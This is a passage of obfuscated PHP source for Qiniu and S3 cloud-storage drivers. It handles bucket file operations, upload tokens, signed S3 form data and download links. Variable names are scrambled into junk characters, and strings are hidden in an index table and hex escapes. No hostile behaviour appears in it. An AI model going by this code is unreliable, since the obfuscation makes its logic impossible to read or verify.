__construct($’¾—“È›) { parent::__construct(); require_once SDK_DIR . $_SERVER[Ì¥ŞÒ°£][1439]; $this->_init($’¾—“È›); } public function _init($¦—áÃáÁ) { $”¨úı•è =& $_SERVER[Ì¥ŞÒ°£]; foreach ($¦—áÃáÁ as $íß„Æ¢ => $ØÜÜßÉ¯) { if (isset($this->{$íß„Æ¢})) { $this->{$íß„Æ¢} = $ØÜÜßÉ¯; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($”¨úı•è[1440] . LNG($”¨úı•è[1398])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($ãİŞâ¶€, $Œ›áä«¬ = '', $â±ûä´¡ = REPEAT_RENAME) { if ($this->setContent($ãİŞâ¶€, $Œ›áä«¬)) { return $this->getPathOuter($ãİŞâ¶€); } return !1; } public function mkdir($…Ï•Çá¢, $÷×Úáñ« = REPEAT_SKIP) { $Ç”¶¾…Û =& $_SERVER[Ì¥ŞÒ°£]; $øÛòµ‡Œ = trim($…Ï•Çá¢, $Ç”¶¾…Û[8]); if ($this->_isFolder($øÛòµ‡Œ)) { return $this->getPathOuter($øÛòµ‡Œ); } $…Ï•Çá¢ = $øÛòµ‡Œ . $Ç”¶¾…Û[8]; $¤¨÷ª = get_path_this($øÛòµ‡Œ); $²å‘¼²÷ = $…Ï•Çá¢ . $¤¨÷ª; if (!$this->mkfile($²å‘¼²÷)) { return !1; } if (!$this->moveFile($²å‘¼²÷, $…Ï•Çá¢)) { $this->delFile($²å‘¼²÷); return !1; } return $this->getPathOuter($øÛòµ‡Œ); } public function copyFile($˜†‡®‰¾, $’ÊÙê¶Æ) { $›èÅ–¨¶ = $this->bucketManager->copy($this->bucket, $˜†‡®‰¾, $this->bucket, $’ÊÙê¶Æ, !0); return $›èÅ–¨¶ ? !1 : $this->getPathOuter($’ÊÙê¶Æ); } public function moveFile($Â€·Ğë, $¢ ¶ùÏ«) { $Î¾¯Ó¡Í = $this->bucketManager->move($this->bucket, $Â€·Ğë, $this->bucket, $¢ ¶ùÏ«, !0); return $Î¾¯Ó¡Í ? !1 : $this->getPathOuter($¢ ¶ùÏ«); } public function delFile($àÑÍØÛô) { if (!$this->exist($àÑÍØÛô)) { return !0; } $²Í­Æ™… = $this->bucketManager->delete($this->bucket, $àÑÍØÛô); return $²Í­Æ™… ? !1 : !0; } public function delFolder($ÈŸ÷«Õ„) { $øÀ¡ÎãÈ =& $_SERVER[Ì¥ŞÒ°£]; if (!$this->exist($ÈŸ÷«Õ„)) { return !0; } $this->listItemCache = !1; $Î“•³£î = $this->fileList($ÈŸ÷«Õ„); $this->listItemCache = !0; $ŒÃõ¨ = trim($ÈŸ÷«Õ„, $øÀ¡ÎãÈ[8]) . $øÀ¡ÎãÈ[8]; if (!empty($ÈŸ÷«Õ„) && $ÈŸ÷«Õ„ !== $øÀ¡ÎãÈ[197] && !in_array($ŒÃõ¨, $Î“•³£î[$øÀ¡ÎãÈ[82]])) { $Î“•³£î[$øÀ¡ÎãÈ[82]][] = $ŒÃõ¨; } $úù†í™¾ = $this->delByBatch($Î“•³£î[$øÀ¡ÎãÈ[83]]); if (!$úù†í™¾) { return !1; } $úù†í™¾ = $this->delByBatch($Î“•³£î[$øÀ¡ÎãÈ[82]]); if (!$úù†í™¾) { return !1; } return $this->delFile($ŒÃõ¨); } private function delByBatch($óñà’ä¶) { foreach (array_chunk($óñà’ä¶, 1000) as $æ©©Œ–Û) { $’›éõŸ = $this->bucketManager->buildBatchDelete($this->bucket, $æ©©Œ–Û); list($ÑĞ«°õ, $µæéøÍ) = $this->bucketManager->batch($’›éõŸ); if ($µæéøÍ) { return !1; } } return !0; } public function rename($ó³±Çğ©, $ûïÇİô) { return $this->renameObject($ó³±Çğ©, $ûïÇİô); } public function fileInfo($–‚ñ½ı§, $âØ£™Óø = false, $ŠüŠÑó¾ = array()) { $æïÕ½«¦ =& $_SERVER[Ì¥ŞÒ°£]; $š‚ç¨£÷ = array($æïÕ½«¦[32] => $this->pathThis($–‚ñ½ı§), $æïÕ½«¦[84] => $this->getPathOuter($æïÕ½«¦[8] . $–‚ñ½ı§), $æïÕ½«¦[33] => $æïÕ½«¦[199], $æïÕ½«¦[76] => isset($ŠüŠÑó¾[$æïÕ½«¦[1441]]) ? $ŠüŠÑó¾[$æïÕ½«¦[1441]] : 0, $æïÕ½«¦[174] => $this->ext($–‚ñ½ı§)); if ($âØ£™Óø) { return $š‚ç¨£÷; } $š‚ç¨£÷[$æïÕ½«¦[200]] = $š‚ç¨£÷[$æïÕ½«¦[85]] = 0; $š‚ç¨£÷[$æïÕ½«¦[201]] = $š‚ç¨£÷[$æïÕ½«¦[202]] = !0; if (empty($ŠüŠÑó¾)) { $ŠüŠÑó¾ = $this->objectMeta($–‚ñ½ı§); if (!$ŠüŠÑó¾) { return $š‚ç¨£÷; } } if (isset($ŠüŠÑó¾[$æïÕ½«¦[1442]])) { $š‚ç¨£÷[$æïÕ½«¦[85]] = substr($ŠüŠÑó¾[$æïÕ½«¦[1442]] . $æïÕ½«¦[12], 0, 10); } if (isset($ŠüŠÑó¾[$æïÕ½«¦[1441]])) { $š‚ç¨£÷[$æïÕ½«¦[76]] = $ŠüŠÑó¾[$æïÕ½«¦[1441]]; } return $š‚ç¨£÷; } public function folderInfo($õ¾µşßÒ, $Îú©ªÖ¡ = false) { $×±Ú—É´ =& $_SERVER[Ì¥ŞÒ°£]; $›¶ ƒ£ = array($×±Ú—É´[32] => $this->pathThis($õ¾µşßÒ), $×±Ú—É´[84] => $this->getPathOuter($×±Ú—É´[8] . $õ¾µşßÒ), $×±Ú—É´[33] => $×±Ú—É´[75]); if ($Îú©ªÖ¡) { return $›¶ ƒ£; } $›¶ ƒ£[$×±Ú—É´[200]] = $›¶ ƒ£[$×±Ú—É´[85]] = 0; $›¶ ƒ£[$×±Ú—É´[201]] = $›¶ ƒ£[$×±Ú—É´[202]] = !0; $õ¾µşßÒ = rtrim($õ¾µşßÒ, $×±Ú—É´[8]) . $×±Ú—É´[8]; $ïú³î”ƒ = $this->objectMeta($õ¾µşßÒ); if (isset($ïú³î”ƒ[$×±Ú—É´[1442]])) { $›¶ ƒ£[$×±Ú—É´[85]] = substr($ïú³î”ƒ[$×±Ú—É´[1442]] . $×±Ú—É´[12], 0, 10); } return $›¶ ƒ£; } public function listPath($²ĞÚÏà, $Áöƒ‚€ˆ = false) { $úÒèÊÚ =& $_SERVER[Ì¥ŞÒ°£]; $­¿²¹² = $this->fileList($²ĞÚÏà, $úÒèÊÚ[8], !0); foreach ($­¿²¹²[$úÒèÊÚ[82]] as $È¥±ª® => $“Ë¨®¢) { $­¿²¹²[$úÒèÊÚ[82]][$È¥±ª®] = $this->folderInfo($“Ë¨®¢, $Áöƒ‚€ˆ); } foreach ($­¿²¹²[$úÒèÊÚ[83]] as $È¥±ª® => $“Ë¨®¢) { $­¿²¹²[$úÒèÊÚ[83]][$È¥±ª®] = $this->fileInfo($“Ë¨®¢[$úÒèÊÚ[94]], $Áöƒ‚€ˆ, $“Ë¨®¢); } return $­¿²¹²; } public function has($ìİğ¥ùô, $Ç’¦¡š˜ = false, $ìˆâÃ‰ã = true) { $ÈÉËÅíÆ =& $_SERVER[Ì¥ŞÒ°£]; $ìİğ¥ùô = trim($ìİğ¥ùô, $ÈÉËÅíÆ[8]); $¼ºßÕŞƒ = empty($ìİğ¥ùô) && $ìİğ¥ùô !== $ÈÉËÅíÆ[197] ? $ÈÉËÅíÆ[12] : $ìİğ¥ùô . $ÈÉËÅíÆ[8]; $¥ô‡œ‹ = $ÈÉËÅíÆ[12]; $²®é¯İâ = 500; $š—Åıø¸ = $ÈÉËÅíÆ[8]; $¿Õ ä†ğ = $ïäØò„• = 0; while (!0) { check_abort(); list($ñ¹é­½Ş, $˜–­©ª˜) = $this->bucketManager->listFiles($this->bucket, $¼ºßÕŞƒ, $¥ô‡œ‹, $²®é¯İâ, $š—Åıø¸); if ($˜–­©ª˜) { break; } $¥ô‡œ‹ = array_key_exists($ÈÉËÅíÆ[1410], $ñ¹é­½Ş) ? $¥ô‡œ‹ = $ñ¹é­½Ş[$ÈÉËÅíÆ[1443]] : $ÈÉËÅíÆ[12]; if ($Ç’¦¡š˜) { if (!empty($ñ¹é­½Ş[$ÈÉËÅíÆ[1444]])) { $¿Õ ä†ğ += count($ñ¹é­½Ş[$ÈÉËÅíÆ[1444]]); } if (!empty($ñ¹é­½Ş[$ÈÉËÅíÆ[1445]])) { $ïäØò„• += count($ñ¹é­½Ş[$ÈÉËÅíÆ[1445]]); } if ($¥ô‡œ‹ === $ÈÉËÅíÆ[12]) { break; } continue; } if ($ìˆâÃ‰ã) { if (!empty($ñ¹é­½Ş[$ÈÉËÅíÆ[1444]])) { return !0; } } else { if (!empty($ñ¹é­½Ş[$ÈÉËÅíÆ[1445]])) { return !0; } } if ($¥ô‡œ‹ === $ÈÉËÅíÆ[12]) { break; } } if ($Ç’¦¡š˜) { return array($ÈÉËÅíÆ[207] => $¿Õ ä†ğ, $ÈÉËÅíÆ[208] => $ïäØò„•); } return !1; } public function listAll($ £ÁÔË) { $Ôœ¤¬İÍ =& $_SERVER[Ì¥ŞÒ°£]; $åêªÅøõ = $this->fileList($ £ÁÔË, $Ôœ¤¬İÍ[12], !0); $¦®ñ•Ü = array(); foreach ($åêªÅøõ[$Ôœ¤¬İÍ[83]] as $•ˆš‘©) { $¦®ñ•Ü[$•ˆš‘©[$Ôœ¤¬İÍ[94]]] = $•ˆš‘©[$Ôœ¤¬İÍ[76]]; } foreach ($åêªÅøõ[$Ôœ¤¬İÍ[82]] as $•ˆš‘©) { if (is_string($•ˆš‘©)) { $¦®ñ•Ü[$•ˆš‘©] = 0; } } return $this->listAllFiles($ £ÁÔË, array_keys($¦®ñ•Ü), $¦®ñ•Ü); } private function fileList($ñÅ®„, $ëĞÒÙÒĞ = '', $Ïš«Ç = 0) { $îª½”¨› =& $_SERVER[Ì¥ŞÒ°£]; $ñÅ®„ = trim($ñÅ®„, $îª½”¨›[8]); $¶·¤ìµå = empty($ñÅ®„) && $ñÅ®„ !== $îª½”¨›[197] ? $îª½”¨›[12] : $ñÅ®„ . $îª½”¨›[8]; $ÃîàÉ = $îª½”¨›[12]; $º¯æŸŞ« = 1000; $¾Ã±ŠÎ§ = $™·°ÇõÒ = array(); while (!0) { check_abort(); list($¥ÛãŞ‘—, $©ÖØ³ô) = $this->bucketManager->listFiles($this->bucket, $¶·¤ìµå, $ÃîàÉ, $º¯æŸŞ«, $ëĞÒÙÒĞ); if ($©ÖØ³ô) { break; } $ÃîàÉ = array_key_exists($îª½”¨›[1410], $¥ÛãŞ‘—) ? $ÃîàÉ = $¥ÛãŞ‘—[$îª½”¨›[1443]] : $îª½”¨›[12]; $…à»ûÑ = isset($¥ÛãŞ‘—[$îª½”¨›[1444]]) ? $¥ÛãŞ‘—[$îª½”¨›[1444]] : array(); $ò¤˜µ•³ = isset($¥ÛãŞ‘—[$îª½”¨›[1445]]) ? $¥ÛãŞ‘—[$îª½”¨›[1445]] : array(); foreach ($…à»ûÑ as $«ÊŒëøÓ) { if ($«ÊŒëøÓ[$îª½”¨›[94]] == $¶·¤ìµå) { continue; } $š¯Ø·ó = $«ÊŒëøÓ[$îª½”¨›[94]]; $³«”€ = $«ÊŒëøÓ[$îª½”¨›[1441]]; $«ÊŒëøÓ[$îª½”¨›[76]] = $³«”€; $Ù­²Áß = $³«”€ == 0 && substr($š¯Ø·ó, strlen($š¯Ø·ó) - 1, 1) == $îª½”¨›[8] ? !0 : !1; $this->cacheMethodInfoSet($š¯Ø·ó, $Ù­²Áß, $«ÊŒëøÓ); if ($Ù­²Áß) { $¾Ã±ŠÎ§[] = $š¯Ø·ó; continue; } $™·°ÇõÒ[] = $Ïš«Ç ? $«ÊŒëøÓ : $š¯Ø·ó; } foreach ($ò¤˜µ•³ as $š¯Ø·ó) { if ($š¯Ø·ó == $¶·¤ìµå) { continue; } $¾Ã±ŠÎ§[] = $š¯Ø·ó; $this->cacheMethodInfoSet($š¯Ø·ó, !0); } if ($ÃîàÉ === $îª½”¨›[12]) { break; } } $this->cacheMethodInfoSet($ñÅ®„, !0); return array($îª½”¨›[82] => $¾Ã±ŠÎ§, $îª½”¨›[83] => $™·°ÇõÒ); } public function canRead($…€Š—òú) { return $this->exist($…€Š—òú) ? !0 : !1; } public function canWrite($•÷Ü¯ãÉ) { return $this->exist($•÷Ü¯ãÉ) ? !0 : !1; } public function getContent($¡èãÍ·) { return $this->fileSubstr($¡èãÍ·, 0, -1); } public function setContent($”åá¼Š‚, $Úš¸ŸåÎ = '') { $ƒ¿ÔÕ™Ù = $this->tempFile($this->pathThis($”åá¼Š‚)); file_put_contents($ƒ¿ÔÕ™Ù, $Úš¸ŸåÎ); if ($this->upload($”åá¼Š‚, $ƒ¿ÔÕ™Ù)) { $this->tempFileRemve($ƒ¿ÔÕ™Ù); return !0; } return !1; } public function refreshUrls($’¶øÜ¿‡) { $À«µ¹§ =& $_SERVER[Ì¥ŞÒ°£]; $¾šˆã– = array(); if (is_array($’¶øÜ¿‡)) { foreach ($’¶øÜ¿‡ as $óğòÍ½) { $¾šˆã–[] = $this->link($óğòÍ½); } } else { $¾šˆã–[] = $this->link($’¶øÜ¿‡); } $—¤ÍóŒÛ = new Qiniu\Cdn\CdnManager($this->auth); list($úºØ®, $â¿¦¾õè) = $—¤ÍóŒÛ->refreshUrls($¾šˆã–); if ($â¿¦¾õè) { return !1; } return $úºØ®[$À«µ¹§[1188]] == $À«µ¹§[762] ? !0 : !1; } public function fileSubstr($‚ƒ®ÕÌò, $Š¶ÍÔ¢, $Àšûª®) { $îšÛÂ§ =& $_SERVER[Ì¥ŞÒ°£]; if (!($—àúô¦Î = $this->link($‚ƒ®ÕÌò))) { return !1; } $Œ ´„„ = !1; if ($Àšûª® > 0) { $±ÕááŠ¡ = $Š¶ÍÔ¢ + $Àšûª® - 1; $Œ ´„„ = array($îšÛÂ§[1446] . $Š¶ÍÔ¢ . $îšÛÂ§[386] . $±ÕááŠ¡); } $òş«åöÆ = url_request($—àúô¦Î, $îšÛÂ§[230], !1, $Œ ´„„); return $òş«åöÆ[$îšÛÂ§[752]] ? $òş«åöÆ[$îšÛÂ§[1208]] : !1; } public function upload($‚Ûµ¶’õ, $úÓçş¹ , $£»—¿™Ÿ = false, $­÷şÄß£ = REPEAT_REPLACE) { $Â’ºÍšÕ = new Qiniu\Storage\UploadManager(); $”àØú¯ = $this->auth->uploadToken($this->bucket, $‚Ûµ¶’õ); $âÛÓÚÒ = get_file_mime(get_path_ext($úÓçş¹ )); list($å‹¯Æµá, $Ûº¿¨î®) = $Â’ºÍšÕ->putFile($”àØú¯, $‚Ûµ¶’õ, $úÓçş¹ , null, $âÛÓÚÒ); return $Ûº¿¨î® ? !1 : $this->getPathOuter($‚Ûµ¶’õ); } public function uploadFormData($÷’ŠÚ¯, $±İå¥µ = 3600) { return $this->uploadToken($÷’ŠÚ¯, $±İå¥µ); } public function multiUploadFormData($à’±´ò÷, $ŒçÒù…½ = 3600) { return $this->uploadToken($à’±´ò÷, $ŒçÒù…½); } private function uploadToken($ˆ†µ½ÂÑ, $ïìãà†æ = 3600) { $œüâºîÏ =& $_SERVER[Ì¥ŞÒ°£]; $Æ‰ÈÌˆÅ = $ïìãà†æ; $ŞèÂÄòÖ = array($œüâºîÏ[1447] => $œüâºîÏ[1448]); $¦ò¦Îà§ = $ˆ†µ½ÂÑ; $í…ÚºŸ = $this->auth->uploadToken($this->bucket, $¦ò¦Îà§, $Æ‰ÈÌˆÅ, $ŞèÂÄòÖ, !0); $Ï¹©Éæı = empty($this->region) || $this->region == $œüâºîÏ[1449] ? $œüâºîÏ[12] : $œüâºîÏ[386] . $this->region; $Û€õş«÷ = http_type() . "\72\x2f\x2f\165\160\x6c\x6f\141\x64{$Ï¹©Éæı}\56\161\151\156\151\x75\160\56\x63\x6f\x6d\57"; return array($œüâºîÏ[1450] => $í…ÚºŸ, $œüâºîÏ[1451] => $Û€õş«÷); } public function download($§Šêæ¢æ, $×ñ¯êñ) { $ß½Ú•¡ = IO::getPathInner(IO::mkfile($×ñ¯êñ)); if (!($¡û­Øãâ = $this->link($§Šêæ¢æ))) { return !1; } $¦¸¾Œ¹¯ = 0; $µ‘Ë·ˆÈ = 1024 * 200; $ÓÎĞ¡®ª = fopen($ß½Ú•¡, $_SERVER[Ì¥ŞÒ°£][1452]); while (!0) { $çùŠ¥­ = $this->fileSubstr($§Šêæ¢æ, $¦¸¾Œ¹¯, $µ‘Ë·ˆÈ); if ($çùŠ¥­ === !1) { return !1; } fwrite($ÓÎĞ¡®ª, $çùŠ¥­); $¦¸¾Œ¹¯ += $µ‘Ë·ˆÈ; if (strlen($çùŠ¥­) < $µ‘Ë·ˆÈ) { break; } } fclose($ÓÎĞ¡®ª); return $×ñ¯êñ; } public function link($ÃëÄœˆ², $ñ¿ì½“î = '') { if (!$this->isFile($ÃëÄœˆ²)) { return !1; } $Ÿ•Â€¬ = $this->getHost() . $_SERVER[Ì¥ŞÒ°£][8] . $this->pathEncode($ÃëÄœˆ²) . $ñ¿ì½“î; return $this->auth->privateDownloadUrl($Ÿ•Â€¬, 3600 * 12); } public function fileOut($Ø¦ÜÙ, $ÏÀ¬ïœ¡ = false, $ƒ±Àßå¹ = false, $ùÛÜÌâ = '') { $çò£Àêß =& $_SERVER[Ì¥ŞÒ°£]; if ($this->isFileOutServer()) { return $this->fileOutServer($Ø¦ÜÙ, $ÏÀ¬ïœ¡, $ƒ±Àßå¹, $ùÛÜÌâ); } if (!$ƒ±Àßå¹) { $ƒ±Àßå¹ = $this->pathThis($Ø¦ÜÙ); } $í¾ìÂ¿× = $ÏÀ¬ïœ¡ ? $çò£Àêß[1453] . rawurlencode($ƒ±Àßå¹) : $çò£Àêß[12]; $…áĞœú¯ = $this->link($Ø¦ÜÙ, $í¾ìÂ¿×); $this->fileOutLink($…áĞœú¯); } public function fileOutServer($Ùæö¬÷©, $›¼êá¦ = false, $¸áâß‚ = false, $´ş­¡ËÂ = '') { parent::fileOut($Ùæö¬÷©, $›¼êá¦, $¸áâß‚, $´ş­¡ËÂ); } public function fileOutImage($ÙÂˆ‚¥», $ÆÍÈ°×ù = 250) { $õÔÇÌÓÍ = $this->link($ÙÂˆ‚¥», $_SERVER[Ì¥ŞÒ°£][1454] . $ÆÍÈ°×ù); $this->fileOutLink($õÔÇÌÓÍ); } public function fileOutImageServer($ƒÓíÀì, $²Ü—Ùˆì = 250) { parent::fileOutImage($ƒÓíÀì, $²Ü—Ùˆì); } public function hashMd5($˜¢œË÷Ş) { $‰ßƒ€Œ =& $_SERVER[Ì¥ŞÒ°£]; $åş®ë¯ = $this->objectMeta($˜¢œË÷Ş); return isset($åş®ë¯[$‰ßƒ€Œ[212]]) ? $åş®ë¯[$‰ßƒ€Œ[212]] : !1; $Ãï•Ò = $this->link($˜¢œË÷Ş, $‰ßƒ€Œ[1455]); } public function size($Ä÷¿„¦) { $ÎãÆé»Î = $this->objectMeta($Ä÷¿„¦); return $ÎãÆé»Î ? $ÎãÆé»Î[$_SERVER[Ì¥ŞÒ°£][76]] : 0; } public function info($£Ã§øš ) { if ($this->isFolder($£Ã§øš )) { return $this->folderInfo($£Ã§øš ); } else { if ($this->isFile($£Ã§øš )) { return $this->fileInfo($£Ã§øš ); } } return !1; } public function exist($Ç÷£‹à) { return $this->isFile($Ç÷£‹à) || $this->isFolder($Ç÷£‹à); } public function isFile($’¬¬âœ³) { return !$this->isFolder($’¬¬âœ³) && $this->objectMeta($’¬¬âœ³); } public function isFolder($ŒªºëÓÓ) { return $this->cacheMethod($_SERVER[Ì¥ŞÒ°£][165], $ŒªºëÓÓ); } protected function objectMeta($ˆÔ¾Ûã¬) { return $this->cacheMethod($_SERVER[Ì¥ŞÒ°£][167], $ˆÔ¾Ûã¬); } protected function _objectMeta($•øùøü) { $¤¤·ĞÆ“ =& $_SERVER[Ì¥ŞÒ°£]; list($ØƒÅÛñ§, $¢Â†Ÿ¢®) = $this->bucketManager->stat($this->bucket, $•øùøü); if ($ØƒÅÛñ§) { $ØƒÅÛñ§[$¤¤·ĞÆ“[76]] = intval($ØƒÅÛñ§[$¤¤·ĞÆ“[1441]]); } return $ØƒÅÛñ§; } protected function _isFolder($ÒÀ´Š) { $ùò¢ç‰– =& $_SERVER[Ì¥ŞÒ°£]; if ($ÒÀ´Š == $ùò¢ç‰–[12] || $ÒÀ´Š == $ùò¢ç‰–[8]) { return !0; } list($Û¬Ÿß×, $ø½ÉÃ±) = $this->bucketManager->listFiles($this->bucket, trim($ÒÀ´Š, $ùò¢ç‰–[8]) . $ùò¢ç‰–[8], $ùò¢ç‰–[12], 1, $ùò¢ç‰–[8]); return !empty($Û¬Ÿß×[$ùò¢ç‰–[1444]]) || !empty($Û¬Ÿß×[$ùò¢ç‰–[1445]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($Àï¿»±˜) { parent::__construct($Àï¿»±˜); } public function uploadFormData($Îş´ò ´, $ªØÊú­Ø = 3600) { $ä…›ûü˜ =& $_SERVER[Ì¥ŞÒ°£]; $õëØ¾Ú· = $ä…›ûü˜[198]; $¯ãô¿¸® = $ä…›ûü˜[1360]; $ÚİˆÒâÚ = $ä…›ûü˜[62]; $Ú‡®Ëåõ = gmdate($ä…›ûü˜[1361]); $şğƒ·î = gmdate($ä…›ûü˜[753]); $Ê ÎÜ¯ = $ä…›ûü˜[1362]; $–Ú‚®çî = $ªØÊú­Ø . $ä…›ûü˜[12]; $‚©„»ƒÀ = $ä…›ûü˜[1324]; $±ó–óş‚ = array($this->accessKey, $şğƒ·î, $this->region, $ÚİˆÒâÚ, $Ê ÎÜ¯); $àÑ›¿­¶ = implode($ä…›ûü˜[8], $±ó–óş‚); $ëË°¿¿² = array($ä…›ûü˜[1326] => gmdate($ä…›ûü˜[1325], strtotime($ä…›ûü˜[1363])), $ä…›ûü˜[1327] => array(array($ä…›ûü˜[1329] => $this->bucket), array($ä…›ûü˜[1328] => $õëØ¾Ú·), array($ä…›ûü˜[1330], $ä…›ûü˜[1331], $ä…›ûü˜[12]), array($ä…›ûü˜[1330], $ä…›ûü˜[1364], $ä…›ûü˜[12]), array($ä…›ûü˜[1330], $ä…›ûü˜[1365], $ä…›ûü˜[12]), array($ä…›ûü˜[1332] => $‚©„»ƒÀ), array($ä…›ûü˜[1366] => $àÑ›¿­¶), array($ä…›ûü˜[1367] => $¯ãô¿¸®), array($ä…›ûü˜[1368] => $Ú‡®Ëåõ), array($ä…›ûü˜[1369] => $–Ú‚®çî))); $ÖÚÛ¯ø = base64_encode(json_encode($ëË°¿¿²)); $Ò‘—½µÔ = hash_hmac($ä…›ûü˜[1370], $şğƒ·î, $ä…›ûü˜[1371] . $this->secret, !0); $»¯ì«Ù— = hash_hmac($ä…›ûü˜[1370], $this->region, $Ò‘—½µÔ, !0); $øËÈ«œ÷ = hash_hmac($ä…›ûü˜[1370], $ÚİˆÒâÚ, $»¯ì«Ù—, !0); $Ñî‹º´Œ = hash_hmac($ä…›ûü˜[1370], $Ê ÎÜ¯, $øËÈ«œ÷, !0); $âÄæâø = hash_hmac($ä…›ûü˜[1370], $ÖÚÛ¯ø, $Ñî‹º´Œ); $Éé¶–´× = array($ä…›ûü˜[215] => $ä…›ûü˜[12], $ä…›ûü˜[1372] => $ä…›ûü˜[12], $ä…›ûü˜[1328] => $õëØ¾Ú·, $ä…›ûü˜[1332] => $‚©„»ƒÀ, $ä…›ûü˜[1336] => $ÖÚÛ¯ø, $ä…›ûü˜[1373] => $àÑ›¿­¶, $ä…›ûü˜[1374] => $¯ãô¿¸®, $ä…›ûü˜[1375] => $Ú‡®Ëåõ, $ä…›ûü˜[1376] => $–Ú‚®çî, $ä…›ûü˜[1377] => $âÄæâø, $ä…›ûü˜[181] => $this->getHost()); return $Éé¶–´×; } public function multiUploadFormData($‚ØÀÏË‘, $Äõ×‰° = 3600) { $€¿•‚° =& $_SERVER[Ì¥ŞÒ°£]; $ûäì‘û£ = gmdate($€¿•‚°[1456]); $æÎ­»Ş² = array(); $º¸¸İÄ = $this->client->getUploadId($this->bucket, $‚ØÀÏË‘, $æÎ­»Ş²); if (!$º¸¸İÄ) { return !1; } return array($€¿•‚°[223] => $º¸¸İÄ, $€¿•‚°[181] => $this->getHost() . $€¿•‚°[8] . $this->pathEncode($‚ØÀÏË‘), $€¿•‚°[224] => $ûäì‘û£, $€¿•‚°[94] => $‚ØÀÏË‘); } public function multiUploadAuthData($ˆçƒÈñ, $’•Ö¼Àæ = array()) { $Ñ¡ÛáŸ =& $_SERVER[Ì¥ŞÒ°£]; $üóãÎè = isset($’•Ö¼Àæ[$Ñ¡ÛáŸ[174]]) ? $’•Ö¼Àæ[$Ñ¡ÛáŸ[174]] : $Ñ¡ÛáŸ[12]; $æë›ë = $’•Ö¼Àæ[$Ñ¡ÛáŸ[94]]; unset($’•Ö¼Àæ[$Ñ¡ÛáŸ[94]]); if (isset($’•Ö¼Àæ[$Ñ¡ÛáŸ[225]])) { return $this->listUploadParts($æë›ë, $’•Ö¼Àæ); } $­ò£ŞÌ = array(); if (isset($’•Ö¼Àæ[$Ñ¡ÛáŸ[1457]])) { $­ò£ŞÌ[$Ñ¡ÛáŸ[1458]] = $’•Ö¼Àæ[$Ñ¡ÛáŸ[1457]]; } $—ô¬¾Ê = explode($Ñ¡ÛáŸ[183], $this->getHost()); $ğ‚‘¿ = array($Ñ¡ÛáŸ[1459] => $—ô¬¾Ê[1], $Ñ¡ÛáŸ[1460] => $Ñ¡ÛáŸ[12], $Ñ¡ÛáŸ[215] => $Ñ¡ÛáŸ[120], $Ñ¡ÛáŸ[1372] => $’•Ö¼Àæ[$Ñ¡ÛáŸ[76]]); $»æÈÍçÂ = $Ñ¡ÛáŸ[228]; $‘ßß¼Õ˜ = $Ñ¡ÛáŸ[8] . $this->pathEncode($æë›ë) . $üóãÎè; $›¤è¬Ì™ = $this->client->__getSignatureV4($­ò£ŞÌ, $ğ‚‘¿, $»æÈÍçÂ, $‘ßß¼Õ˜); if (strpos($üóãÎè, $Ñ¡ÛáŸ[227]) === 0) { if (isset($­ò£ŞÌ[$Ñ¡ÛáŸ[1458]])) { $„óı“®¤ = $­ò£ŞÌ[$Ñ¡ÛáŸ[1458]]; } else { if (isset($›¤è¬Ì™[$Ñ¡ÛáŸ[1458]])) { $„óı“®¤ = $›¤è¬Ì™[$Ñ¡ÛáŸ[1458]]; } else { $„óı“®¤ = hash($Ñ¡ÛáŸ[1370], $Ñ¡ÛáŸ[12]); } } return array($Ñ¡ÛáŸ[234] => $›¤è¬Ì™[$Ñ¡ÛáŸ[234]], $Ñ¡ÛáŸ[1458] => $„óı“®¤, $Ñ¡ÛáŸ[224] => $›¤è¬Ì™[$Ñ¡ÛáŸ[1461]]); } return $›¤è¬Ì™[$Ñ¡ÛáŸ[234]]; } public function listUploadParts($ÂË®¥›º, $Ÿµ÷õ = array()) { $€Òğ“œ =& $_SERVER[Ì¥ŞÒ°£]; $ßÁÚıÎ = str_replace($€Òğ“œ[235], $€Òğ“œ[12], $Ÿµ÷õ[$€Òğ“œ[174]]); $‰éä¯úÃ = $this->client->listParts($this->bucket, $ÂË®¥›º, $ßÁÚıÎ); if (!$‰éä¯úÃ) { return !1; } $®‚½ËÖ = $€Òğ“œ[1462]; foreach ($‰éä¯úÃ as $½¥ä„³ˆ) { $®‚½ËÖ .= $€Òğ“œ[1463] . "\74\120\141\162\164\116\x75\155\142\x65\x72\x3e{$½¥ä„³ˆ[$€Òğ“œ[1417]]}\x3c\57\x50\x61\162\164\116\165\x6d\x62\x65\x72\76\12" . "\x3c\105\124\x61\x67\76{$½¥ä„³ˆ[$€Òğ“œ[1418]]}\74\57\105\124\x61\x67\76\12" . $€Òğ“œ[1464]; } $®‚½ËÖ .= $€Òğ“œ[1465]; $ÊŒÖôƒ¼ = array(); $ÏÓş¬Èğ = explode($€Òğ“œ[183], $this->getHost()); $İæ¾àß = array($€Òğ“œ[1459] => $ÏÓş¬Èğ[1], $€Òğ“œ[215] => $€Òğ“œ[120], $€Òğ“œ[1372] => strlen($®‚½ËÖ)); $õ÷½œ³Ñ = $€Òğ“œ[226]; $Ê­ê…ğ¤ = $€Òğ“œ[8] . $this->pathEncode($ÂË®¥›º) . $Ÿµ÷õ[$€Òğ“œ[174]]; $Å³ñƒĞ‘ = $this->client->__getSignatureV4($ÊŒÖôƒ¼, $İæ¾àß, $õ÷½œ³Ñ, $Ê­ê…ğ¤, $®‚½ËÖ); return array($€Òğ“œ[234] => $Å³ñƒĞ‘[$€Òğ“œ[234]], $€Òğ“œ[224] => $Å³ñƒĞ‘[$€Òğ“œ[1461]], $€Òğ“œ[236] => $‰éä¯úÃ, $€Òğ“œ[1458] => $Å³ñƒĞ‘[$€Òğ“œ[1458]]); } public function link($ßİœğôá, $©ŸÍ·Õí = array()) { return parent::link($ßİœğôá, $©ŸÍ·Õí); } public function fileOut($ùó¬µ·Ü, $”Ñ±é­ı = false, $šø‡ñ¹  = false, $ÛÄëì´ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[Ì¥ŞÒ°£][1466])) { return parent::fileOutServer($ùó¬µ·Ü, $”Ñ±é­ı, $šø‡ñ¹ , $ÛÄëì´); } parent::fileOut($ùó¬µ·Ü, $”Ñ±é­ı, $šø‡ñ¹ , $ÛÄëì´); } public 